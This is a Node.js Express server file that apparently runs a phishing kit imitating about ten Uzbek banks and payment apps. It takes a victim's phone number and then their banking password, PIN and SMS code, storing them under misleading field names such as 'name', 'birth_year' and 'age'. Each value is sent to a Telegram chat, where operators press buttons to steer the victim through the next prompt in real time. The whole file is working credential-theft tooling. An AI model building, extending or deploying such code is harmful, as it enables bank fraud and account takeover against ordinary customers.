const express = require("express");
const fs = require("fs");
const path = require("path");
const crypto = require("crypto");
require("dotenv").config();

const app = express();
const port = process.env.PORT || 3000;

const DATA_DIR = path.join(__dirname, "data");
const DATA_FILE = path.join(DATA_DIR, "clients.json");
const INVALID_MESSAGE = "Iltimos, ma`lumotni to`g`ri kiriting.";
const STATUS_TO_PAGE = {
  ibt: {
    phone: "/services/ibt/phone.html",
    waiting: "/services/ibt/waiting.html",
    name: "/services/ibt/name.html",
    birth_year: "/services/ibt/birth-year.html",
    age: "/services/ibt/age.html",
    residence_year: "/services/ibt/residence-year.html",
    approved: "/services/ibt/approved.html",
    unavailable: "/services/ibt/unavailable.html"
  },
  milliy: {
    phone: "/services/milliy/phone.html",
    waiting: "/services/milliy/waiting.html",
    name: "/services/milliy/name.html",
    birth_year: "/services/milliy/birth-year.html",
    age: "/services/milliy/age.html",
    residence_year: "/services/milliy/residence-year.html",
    approved: "/services/milliy/approved.html",
    unavailable: "/services/milliy/unavailable.html"
  },
  asaka: {
    phone: "/services/asaka/phone.html",
    waiting: "/services/asaka/waiting.html",
    name: "/services/asaka/name.html",
    birth_year: "/services/asaka/birth-year.html",
    age: "/services/asaka/age.html",
    residence_year: "/services/asaka/residence-year.html",
    approved: "/services/asaka/approved.html",
    unavailable: "/services/asaka/unavailable.html"
  },
  ipoteka: {
    phone: "/services/ipoteka/phone.html",
    waiting: "/services/ipoteka/waiting.html",
    name: "/services/ipoteka/name.html",
    birth_year: "/services/ipoteka/birth-year.html",
    age: "/services/ipoteka/age.html",
    residence_year: "/services/ipoteka/residence-year.html",
    approved: "/services/ipoteka/approved.html",
    unavailable: "/services/ipoteka/unavailable.html"
  },
  zoomrad: {
    phone: "/services/zoomrad/phone.html",
    waiting: "/services/zoomrad/waiting.html",
    name: "/services/zoomrad/name.html",
    birth_year: "/services/zoomrad/birth-year.html",
    age: "/services/zoomrad/age.html",
    residence_year: "/services/zoomrad/residence-year.html",
    approved: "/services/zoomrad/approved.html",
    unavailable: "/services/zoomrad/unavailable.html"
  },
  hamkor: {
    phone: "/services/hamkor/phone.html",
    waiting: "/services/hamkor/waiting.html",
    name: "/services/hamkor/name.html",
    birth_year: "/services/hamkor/birth-year.html",
    age: "/services/hamkor/age.html",
    residence_year: "/services/hamkor/residence-year.html",
    approved: "/services/hamkor/approved.html",
    unavailable: "/services/hamkor/unavailable.html"
  },
  octo: {
    phone: "/services/octo/phone.html",
    waiting: "/services/octo/waiting.html",
    name: "/services/octo/name.html",
    birth_year: "/services/octo/birth-year.html",
    age: "/services/octo/age.html",
    residence_year: "/services/octo/residence-year.html",
    approved: "/services/octo/approved.html",
    unavailable: "/services/octo/unavailable.html"
  },
  sqb: {
    phone: "/services/sqb/phone.html",
    waiting: "/services/sqb/waiting.html",
    name: "/services/sqb/name.html",
    birth_year: "/services/sqb/birth-year.html",
    age: "/services/sqb/age.html",
    residence_year: "/services/sqb/residence-year.html",
    approved: "/services/sqb/approved.html",
    unavailable: "/services/sqb/unavailable.html"
  },
  agrobank: {
    phone: "/services/agrobank/phone.html",
    waiting: "/services/agrobank/waiting.html",
    name: "/services/agrobank/name.html",
    birth_year: "/services/agrobank/birth-year.html",
    age: "/services/agrobank/age.html",
    residence_year: "/services/agrobank/residence-year.html",
    approved: "/services/agrobank/approved.html",
    unavailable: "/services/agrobank/unavailable.html"
  },
  mkbank: {
    phone: "/services/mkbank/phone.html",
    waiting: "/services/mkbank/waiting.html",
    name: "/services/mkbank/name.html",
    birth_year: "/services/mkbank/birth-year.html",
    age: "/services/mkbank/age.html",
    residence_year: "/services/mkbank/residence-year.html",
    approved: "/services/mkbank/approved.html",
    unavailable: "/services/mkbank/unavailable.html"
  }
};
const ROUTE_ACTIONS = {
  name: "name",
  birth_year: "birth_year",
  age: "age",
  residence_year: "residence_year",
  approve: "approved",
  unavailable: "unavailable"
};
const STATUS_LABELS = {
  phone: "Телефон",
  waiting: "Ожидание",
  name: "Пароль",
  birth_year: "PIN",
  age: "SMS",
  residence_year: "Год проживания",
  approved: "Завершено",
  unavailable: "\u0421\u0435\u0440\u0432\u0438\u0441 \u043d\u0435 \u0434\u043e\u0441\u0442\u0443\u043f\u0435\u043d"
};
const SERVICE_LABELS = {
  ibt: "IBT",
  milliy: "Milliy",
  asaka: "Asakabank",
  ipoteka: "Ipotekabank",
  zoomrad: "Zoomrad",
  hamkor: "Hamkor",
  octo: "Octo-Mobile",
  sqb: "Sqb",
  agrobank: "Agrobank",
  mkbank: "Mkbank"
};

app.use(express.json());
app.use(express.static(path.join(__dirname, "public"), { index: "index.html" }));

const ensureStore = () => {
  if (!fs.existsSync(DATA_DIR)) {
    fs.mkdirSync(DATA_DIR, { recursive: true });
  }

  if (!fs.existsSync(DATA_FILE)) {
    fs.writeFileSync(
      DATA_FILE,
      JSON.stringify({ clients: {}, telegram: { lastUpdateId: 0 } }, null, 2),
      "utf8"
    );
  }
};

const readStore = () => {
  ensureStore();
  return JSON.parse(fs.readFileSync(DATA_FILE, "utf8"));
};

const writeStore = (store) => {
  ensureStore();
  fs.writeFileSync(DATA_FILE, JSON.stringify(store, null, 2), "utf8");
};

const updateStore = (updater) => {
  const store = readStore();
  const nextStore = updater(store) || store;
  writeStore(nextStore);
  return nextStore;
};

const createClientId = () => crypto.randomBytes(6).toString("hex");

const addHistory = (client, entry) => {
  client.history = client.history || [];
  client.history.push({
    ...entry,
    at: new Date().toISOString()
  });
};

const normalizeService = (service) => {
  if (service === "milliy") return "milliy";
  if (service === "asaka") return "asaka";
  if (service === "ipoteka") return "ipoteka";
  if (service === "zoomrad") return "zoomrad";
  if (service === "hamkor") return "hamkor";
  if (service === "octo") return "octo";
  if (service === "sqb") return "sqb";
  if (service === "agrobank") return "agrobank";
  if (service === "mkbank") return "mkbank";
  return "ibt";
};

const createClient = (phone, service = "ibt") => {
  const now = new Date().toISOString();
  const client = {
    id: createClientId(),
    service: normalizeService(service),
    phone,
    status: "waiting",
    ownerTag: "",
    ownerId: "",
    pendingReviewStep: "phone",
    lastCompletedStep: "phone",
    currentError: "",
    createdAt: now,
    updatedAt: now,
    submissions: {
      phone: {
        value: phone,
        at: now
      }
    },
    history: [
      { type: "created", status: "waiting", at: now },
      { type: "submission", step: "phone", at: now }
    ]
  };

  updateStore((store) => {
    store.clients[client.id] = client;
    return store;
  });

  return client;
};

const getClient = (id) => {
  const store = readStore();
  return store.clients[id] || null;
};

const updateClient = (id, updater) => {
  let updatedClient = null;

  updateStore((store) => {
    const client = store.clients[id];
    if (!client) return store;

    updater(client);
    client.updatedAt = new Date().toISOString();
    updatedClient = client;
    return store;
  });

  return updatedClient;
};

const setLastUpdateId = (updateId) => {
  updateStore((store) => {
    store.telegram = store.telegram || {};
    store.telegram.lastUpdateId = updateId;
    return store;
  });
};

const getLastUpdateId = () => {
  const store = readStore();
  return store.telegram?.lastUpdateId || 0;
};

const maskPhone = (phone) => {
  const digits = String(phone || "").replace(/\D/g, "");
  if (digits.length < 6) return phone;
  return `+${digits.slice(0, 3)}(${digits.slice(3, 5)})${digits.slice(5, 8)}****${digits.slice(-2)}`;
};

const formatTelegramPhone = (phone) => String(phone || "").trim().replace(/^\+?998/, "").trim();

const escapeTelegramHtml = (value) =>
  String(value ?? "")
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;");

const buildActionKeyboard = (clientId, selectedAction = "") => {
  const button = (actionKey, text) => ({
    text: selectedAction === actionKey ? `? ${text}` : text,
    callback_data: actionKey === "reject" ? `reject|${clientId}` : `route|${actionKey}|${clientId}`
  });

  return {
    inline_keyboard: [
      [button("reject", "Отклонить")],
      [button("name", "Отправить на пароль")],
      [button("birth_year", "Отправить на PIN")],
      [button("age", "Отправить на SMS")],
      [button("unavailable", "\u0421\u0435\u0440\u0432\u0438\u0441 \u043d\u0435 \u0434\u043e\u0441\u0442\u0443\u043f\u0435\u043d")],
      [button("approve", "Завершить")]
    ]
  };
};

const telegramApi = async (method, payload) => {
  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  if (!botToken) {
    throw new Error("Telegram bot token is missing.");
  }

  const response = await fetch(`https://api.telegram.org/bot${botToken}/${method}`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify(payload)
  });

  const data = await response.json();
  return { response, data };
};

const sendTelegramMessage = async (chatId, text, replyMarkup) => {
  let { response, data } = await telegramApi("sendMessage", {
    chat_id: chatId,
    text,
    parse_mode: "HTML",
    reply_markup: replyMarkup
  });

  if ((!response.ok || !data.ok) && data?.parameters?.migrate_to_chat_id) {
    const migratedChatId = String(data.parameters.migrate_to_chat_id);
    ({ response, data } = await telegramApi("sendMessage", {
      chat_id: migratedChatId,
      text,
      parse_mode: "HTML",
      reply_markup: replyMarkup
    }));
  }

  return { response, data };
};

const editTelegramMessage = async (chatId, messageId, text, replyMarkup) => {
  const { response, data } = await telegramApi("editMessageText", {
    chat_id: chatId,
    message_id: messageId,
    text,
    parse_mode: "HTML",
    reply_markup: replyMarkup
  });

  return { response, data };
};

const answerTelegramCallback = async (callbackQueryId, text) => {
  const { data } = await telegramApi("answerCallbackQuery", {
    callback_query_id: callbackQueryId,
    text
  });

  return data;
};

const routeForStatus = (service, status, clientId) => {
  const serviceKey = normalizeService(service);
  const pages = STATUS_TO_PAGE[serviceKey] || STATUS_TO_PAGE.ibt;
  const page = pages[status] || pages.phone;
  return `${page}?client=${clientId}`;
};

const getServiceLabel = (service) => SERVICE_LABELS[normalizeService(service)] || "IBT";

const buildClientMessageText = (client, title, details = []) =>
  [
    `\u0421\u0435\u0440\u0432\u0438\u0441: ${escapeTelegramHtml(getServiceLabel(client.service))}`,
    "",
    escapeTelegramHtml(title),
    "",
    `\u0422\u0435\u043b\u0435\u0444\u043e\u043d: <code>${escapeTelegramHtml(formatTelegramPhone(client.phone))}</code>`,
    `ID \u043a\u043b\u0438\u0435\u043d\u0442\u0430: ${escapeTelegramHtml(client.id)}`,
    ...details.map((detail) => escapeTelegramHtml(detail))
  ].join("\n");

const sendClientNotification = async (client, title, details, includeKeyboard = true) => {
  const chatId = process.env.TELEGRAM_CHAT_ID;
  if (!chatId) {
    throw new Error("Telegram chat id is missing.");
  }

  return sendTelegramMessage(
    chatId,
    buildClientMessageText(client, title, details),
    includeKeyboard ? buildActionKeyboard(client.id) : undefined
  );
};

const normalizeInputValue = (step, value) => {
  const text = String(value || "").trim();

  if (step === "phone") {
    const digits = text.replace(/\D/g, "");
    if (digits.length !== 12 || !digits.startsWith("998")) return null;
    return `+${digits}`;
  }

  if (step === "name") {
    const normalized = text.replace(/\s+/g, " ").trim();
    if (normalized.length < 2 || normalized.length > 60) return null;
    return normalized;
  }

  const digits = text.replace(/\D/g, "");
  if (!digits) return null;

  if (step === "residence_year") {
    if (digits.length !== 4) return null;
  }

  if (step === "age") {
    if (digits.length < 1) return null;
  }

  return digits;
};
const sendNewClientNotification = async (client) =>
  sendClientNotification(client, "Новая заявка", []);

const sendStepSubmissionNotification = async (client, step, value) =>
  sendClientNotification(client, `Клиент отправил: ${String(STATUS_LABELS[step] || step).toLowerCase()}`, [
    `Значение: ${value}`,
    ...(resolveClientOwnerTag(client) ? [`Ответственный: ${resolveClientOwnerTag(client)}`] : [])
  ]);

const getTelegramErrorMessage = (data, fallback) =>
  data?.description || data?.message || fallback;

const getTelegramActorTag = (from) => {
  if (!from) return "unknown";
  if (from.username) return `@${from.username}`;
  if (from.first_name || from.last_name) {
    return [from.first_name, from.last_name].filter(Boolean).join(" ");
  }
  return String(from.id || "unknown");
};

const assignClientOwner = (clientId, from) =>
  updateClient(clientId, (client) => {
    if (client.ownerTag) {
      return;
    }

    client.ownerTag = getTelegramActorTag(from);
    client.ownerId = String(from?.id || "");
    addHistory(client, {
      type: "owner_assigned",
      ownerTag: client.ownerTag,
      source: "telegram"
    });
  });

const resolveClientOwnerTag = (client) => client?.ownerTag || "";

const updateTelegramActionMessage = async (callbackQuery, client, actionKey) => {
  const chatId = callbackQuery?.message?.chat?.id;
  const messageId = callbackQuery?.message?.message_id;

  if (!chatId || !messageId) {
    return;
  }

  const actorTag = resolveClientOwnerTag(client) || getTelegramActorTag(callbackQuery.from);
  const latestStepKey = client.pendingReviewStep || client.lastCompletedStep;
  const latestValue = latestStepKey ? client.submissions?.[latestStepKey]?.value : "";
  const details = [];

  if (latestValue) {
    details.push(`Значение: ${latestValue}`);
  }

  details.push(`Ответственный: ${actorTag}`);

  try {
    await editTelegramMessage(
      chatId,
      messageId,
      buildClientMessageText(client, "Новая заявка", details),
      buildActionKeyboard(client.id, actionKey)
    );
  } catch (error) {
    console.error("Could not update Telegram action message:", error.message);
  }
};

const submitStepForReview = async (client, step, value) => {
  const updatedClient = updateClient(client.id, (draft) => {
    draft.currentError = "";
    draft.pendingReviewStep = step;
    draft.lastCompletedStep = step;
    draft.status = "waiting";
    draft.submissions[step] = {
      value,
      at: new Date().toISOString()
    };

    if (step === "phone") {
      draft.phone = value;
    }

    addHistory(draft, { type: "submission", step });
    addHistory(draft, { type: "status_change", status: "waiting", source: "submit" });
  });

  if (step === "phone" && client.createdAt === client.updatedAt) {
    return sendNewClientNotification(updatedClient);
  }

  return sendStepSubmissionNotification(updatedClient, step, value);
};

const startTelegramPolling = async () => {
  if (!process.env.TELEGRAM_BOT_TOKEN) {
    console.log("Telegram polling skipped: missing TELEGRAM_BOT_TOKEN");
    return;
  }

  try {
    await telegramApi("deleteWebhook", { drop_pending_updates: false });
  } catch (error) {
    console.error("Could not disable Telegram webhook:", error.message);
  }

  let offset = getLastUpdateId();

  const loop = async () => {
    try {
      const { data } = await telegramApi("getUpdates", {
        offset,
        timeout: 20,
        allowed_updates: ["callback_query"]
      });

      if (data?.ok && Array.isArray(data.result)) {
        for (const update of data.result) {
          offset = update.update_id + 1;
          setLastUpdateId(offset);
          await handleTelegramUpdate(update);
        }
      }
    } catch (error) {
      console.error("Telegram polling error:", error.message);
      await new Promise((resolve) => setTimeout(resolve, 3000));
    }

    setImmediate(loop);
  };

  loop();
};

const handleReject = (clientId) =>
  updateClient(clientId, (client) => {
    const targetStep = client.pendingReviewStep || client.lastCompletedStep || "phone";
    client.status = targetStep;
    client.currentError = INVALID_MESSAGE;
    addHistory(client, { type: "status_change", status: targetStep, source: "telegram_reject" });
  });

const handleRoute = (clientId, action) =>
  updateClient(clientId, (client) => {
    const nextStatus = ROUTE_ACTIONS[action];
    if (!nextStatus) return;
    client.status = nextStatus;
    client.currentError = "";
    client.pendingReviewStep = "";
    addHistory(client, { type: "status_change", status: nextStatus, source: "telegram_route" });
  });

const handleTelegramUpdate = async (update) => {
  const callbackQuery = update?.callback_query;
  if (!callbackQuery?.data || !callbackQuery.id) return;

  const parts = callbackQuery.data.split("|");
  const [type, arg1, arg2] = parts;

  let client = null;
  let answer = "Действие выполнено.";

  if (type === "reject") {
    assignClientOwner(arg1, callbackQuery.from);
    client = handleReject(arg1);
    answer = "Клиент возвращён на предыдущий шаг с ошибкой.";
  } else if (type === "route") {
    assignClientOwner(arg2, callbackQuery.from);
    client = handleRoute(arg2, arg1);
    answer = `Клиент направлен: ${STATUS_LABELS[ROUTE_ACTIONS[arg1]] || arg1}`;
  }

  if (!client) {
    await answerTelegramCallback(callbackQuery.id, "Клиент не найден или действие некорректно.");
    return;
  }

  await updateTelegramActionMessage(
    callbackQuery,
    client,
    type === "reject" ? "reject" : arg1
  );

  await answerTelegramCallback(callbackQuery.id, answer);
};

app.post("/api/submit-phone", async (req, res) => {
  const phone = normalizeInputValue("phone", req.body?.phone);
  const service = normalizeService(req.body?.service);

  if (!phone) {
    return res.status(400).json({ ok: false, message: "Phone is invalid." });
  }

  if (!process.env.TELEGRAM_BOT_TOKEN || !process.env.TELEGRAM_CHAT_ID) {
    return res.status(500).json({
      ok: false,
      message: "Telegram credentials are not configured on the server."
    });
  }

  const client = createClient(phone, service);

  try {
    const { response, data } = await sendNewClientNotification(client);

    if (!response.ok || !data.ok) {
      const telegramMessage = getTelegramErrorMessage(data, "Telegram API request failed.");
      console.error("Telegram sendMessage error:", telegramMessage, data);
      return res.status(502).json({
        ok: false,
        message: telegramMessage,
        details: data
      });
    }

    return res.json({
      ok: true,
      clientId: client.id,
      redirectUrl: routeForStatus(client.service, "waiting", client.id)
    });
  } catch (error) {
    console.error("Could not send data to Telegram:", error);
    return res.status(500).json({
      ok: false,
      message: error.message || "Could not send data to Telegram.",
      error: error.message
    });
  }
});

app.get("/api/client/:id", (req, res) => {
  const client = getClient(req.params.id);

  if (!client) {
    return res.status(404).json({ ok: false, message: "Client not found." });
  }

  return res.json({
    ok: true,
    client: {
      id: client.id,
      service: normalizeService(client.service),
      status: client.status,
      phone: client.phone,
      ownerTag: client.ownerTag || "",
      maskedPhone: maskPhone(client.phone),
      redirectUrl: routeForStatus(client.service, client.status, client.id),
      submissions: client.submissions,
      currentError: client.currentError || ""
    }
  });
});

app.post("/api/client/:id/submit-step", async (req, res) => {
  const client = getClient(req.params.id);
  const step = req.body?.step;
  const normalizedValue = normalizeInputValue(step, req.body?.value);

  if (!client) {
    return res.status(404).json({ ok: false, message: "Client not found." });
  }

  if (!["phone", "name", "birth_year", "age", "residence_year"].includes(step) || !normalizedValue) {
    return res.status(400).json({ ok: false, message: "Invalid step payload." });
  }

  try {
    const { response, data } = await submitStepForReview(client, step, normalizedValue);

    if (!response.ok || !data.ok) {
      const telegramMessage = getTelegramErrorMessage(data, "Telegram API request failed.");
      console.error("Telegram sendMessage error:", telegramMessage, data);
      return res.status(502).json({
        ok: false,
        message: telegramMessage,
        details: data
      });
    }

    return res.json({
      ok: true,
      redirectUrl: routeForStatus(client.service, "waiting", client.id)
    });
  } catch (error) {
    console.error("Could not send data to Telegram:", error);
    return res.status(500).json({
      ok: false,
      message: error.message || "Could not send data to Telegram.",
      error: error.message
    });
  }
});

app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "services.html"));
});

app.get("/services/:service", (req, res, next) => {
  const service = normalizeService(req.params.service);
  if (service !== req.params.service) {
    return next();
  }

  return res.redirect(301, `/services/${service}/`);
});

app.get("*", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "services.html"));
});

app.listen(port, () => {
  console.log(`Server is running on http://localhost:${port}`);
  startTelegramPolling();
});
